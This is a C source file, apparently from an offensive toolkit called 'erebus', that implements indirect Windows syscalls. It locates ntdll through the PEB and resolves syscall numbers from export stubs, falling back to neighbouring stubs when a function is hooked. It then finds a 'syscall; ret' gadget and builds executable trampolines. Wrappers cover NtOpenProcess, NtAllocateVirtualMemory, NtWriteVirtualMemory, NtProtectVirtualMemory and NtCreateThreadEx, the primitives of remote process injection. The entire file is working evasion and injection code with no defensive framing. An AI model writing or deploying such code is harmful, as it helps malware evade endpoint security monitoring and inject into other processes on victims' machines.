#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdint.h>
#include <string.h>

#include "erebus/syscall.h"

typedef LONG NTSTATUS;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID     Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID     Reserved2[2];
    PVOID     DllBase;
    BYTE      Reserved3[8];
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

#define EREBUS_MAX_SYSCALLS 8

typedef struct erebus_syscall_entry {
    DWORD  ssn;
    PVOID  stub;
    char   name[48];
} erebus_syscall_entry;

static erebus_syscall_entry g_syscalls[EREBUS_MAX_SYSCALLS];
static int g_syscall_count = 0;

static PVOID erebus_get_ntdll(void) {
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY cur = head->Flink; cur != head; cur = cur->Flink) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer && _wcsicmp(entry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
            return entry->DllBase;
        }
    }
    return NULL;
}

static DWORD erebus_resolve_ssn_name(PVOID ntdll, const char *target) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)ntdll +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD *names = (DWORD *)((BYTE *)ntdll + exp->AddressOfNames);
    WORD *ords = (WORD *)((BYTE *)ntdll + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)ntdll + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *fn = (char *)((BYTE *)ntdll + names[i]);
        if (strcmp(fn, target) != 0) continue;
        BYTE *stub = (BYTE *)((BYTE *)ntdll + funcs[ords[i]]);
        if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
            return *(DWORD *)(stub + 4);
        for (int d = 1; d < 32; d++) {
            BYTE *up = stub + d * 32;
            BYTE *dn = stub - d * 32;
            if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8)
                return *(DWORD *)(up + 4) - d;
            if (dn[0] == 0x4C && dn[1] == 0x8B && dn[2] == 0xD1 && dn[3] == 0xB8)
                return *(DWORD *)(dn + 4) + d;
        }
    }
    return 0xFFFFFFFF;
}

static PVOID erebus_find_gadget(PVOID ntdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)ntdll + dos->e_lfanew);
    DWORD size = nt->OptionalHeader.SizeOfImage;
    BYTE *base = (BYTE *)ntdll;
    for (DWORD i = 0; i + 2 < size; i++) {
        if (base[i] == 0x0F && base[i + 1] == 0x05 && base[i + 2] == 0xC3)
            return &base[i];
    }
    return NULL;
}

#ifdef _WIN64
#pragma pack(push, 1)
typedef struct erebus_jmp_gadget {
    BYTE mov_r10_rcx[3];
    BYTE mov_eax[1];
    DWORD ssn;
    BYTE jmp[6];
    UINT64 gadget;
} erebus_jmp_gadget;
#pragma pack(pop)

static PVOID erebus_build_stub(DWORD ssn, PVOID gadget) {
    erebus_jmp_gadget *s = (erebus_jmp_gadget *)VirtualAlloc(
        NULL, sizeof(erebus_jmp_gadget), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!s) return NULL;
    s->mov_r10_rcx[0] = 0x4C; s->mov_r10_rcx[1] = 0x8B; s->mov_r10_rcx[2] = 0xD1;
    s->mov_eax[0] = 0xB8;
    s->ssn = ssn;
    s->jmp[0] = 0xFF; s->jmp[1] = 0x25;
    s->jmp[2] = 0x00; s->jmp[3] = 0x00; s->jmp[4] = 0x00; s->jmp[5] = 0x00;
    s->gadget = (UINT64)(ULONG_PTR)gadget;
    DWORD old;
    VirtualProtect(s, sizeof(*s), PAGE_EXECUTE_READ, &old);
    return s;
}
#endif

static int erebus_register(const char *name, PVOID ntdll, PVOID gadget) {
    if (g_syscall_count >= EREBUS_MAX_SYSCALLS) return 0;
    DWORD ssn = erebus_resolve_ssn_name(ntdll, name);
    if (ssn == 0xFFFFFFFF) return 0;
#ifdef _WIN64
    PVOID stub = erebus_build_stub(ssn, gadget);
    if (!stub) return 0;
#else
    PVOID stub = NULL;
#endif
    erebus_syscall_entry *e = &g_syscalls[g_syscall_count++];
    e->ssn = ssn;
    e->stub = stub;
    strncpy(e->name, name, sizeof(e->name) - 1);
    return 1;
}

static erebus_syscall_entry *erebus_lookup(const char *name) {
    for (int i = 0; i < g_syscall_count; i++)
        if (strcmp(g_syscalls[i].name, name) == 0) return &g_syscalls[i];
    return NULL;
}

int erebus_syscall_init(void) {
    PVOID ntdll = erebus_get_ntdll();
    PVOID gadget = ntdll ? erebus_find_gadget(ntdll) : NULL;
    if (!ntdll || !gadget) return 0;
    erebus_register("NtAllocateVirtualMemory", ntdll, gadget);
    erebus_register("NtWriteVirtualMemory", ntdll, gadget);
    erebus_register("NtProtectVirtualMemory", ntdll, gadget);
    erebus_register("NtCreateThreadEx", ntdll, gadget);
    erebus_register("NtOpenProcess", ntdll, gadget);
    return g_syscall_count > 0;
}

#ifdef _WIN64
typedef NTSTATUS (NTAPI *erebus_stub_fn)(PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID);

#define EREBUS_INVOKE(name, ...) do { \
    erebus_syscall_entry *_e = erebus_lookup(name); \
    if (!_e || !_e->stub) return (NTSTATUS)0xC0000001L; \
    return ((erebus_stub_fn)_e->stub)(__VA_ARGS__); \
} while (0)
#else
#define EREBUS_INVOKE(name, ...) return (NTSTATUS)0xC0000001L
#endif

NTSTATUS erebus_NtAllocateVirtualMemory(HANDLE h, PVOID *base, ULONG_PTR z, PSIZE_T sz, ULONG type, ULONG prot) {
    EREBUS_INVOKE("NtAllocateVirtualMemory", h, base, (PVOID)z, sz, (PVOID)(ULONG_PTR)type, (PVOID)(ULONG_PTR)prot, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS erebus_NtWriteVirtualMemory(HANDLE h, PVOID base, PVOID buf, SIZE_T n, PSIZE_T written) {
    EREBUS_INVOKE("NtWriteVirtualMemory", h, base, buf, (PVOID)n, written, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS erebus_NtProtectVirtualMemory(HANDLE h, PVOID *base, PSIZE_T sz, ULONG prot, PULONG old) {
    EREBUS_INVOKE("NtProtectVirtualMemory", h, base, sz, (PVOID)(ULONG_PTR)prot, old, NULL, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS erebus_NtCreateThreadEx(PHANDLE th, ACCESS_MASK acc, PVOID oa, HANDLE proc, PVOID start, PVOID arg,
    ULONG flags, SIZE_T zb, SIZE_T ss, SIZE_T mss, PVOID al) {
    EREBUS_INVOKE("NtCreateThreadEx", th, (PVOID)(ULONG_PTR)acc, oa, proc, start, arg,
        (PVOID)(ULONG_PTR)flags, (PVOID)zb, (PVOID)ss, (PVOID)mss, al);
}

NTSTATUS erebus_NtOpenProcess(PHANDLE h, ACCESS_MASK acc, PVOID oa, PVOID cid) {
    EREBUS_INVOKE("NtOpenProcess", h, (PVOID)(ULONG_PTR)acc, oa, cid, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
}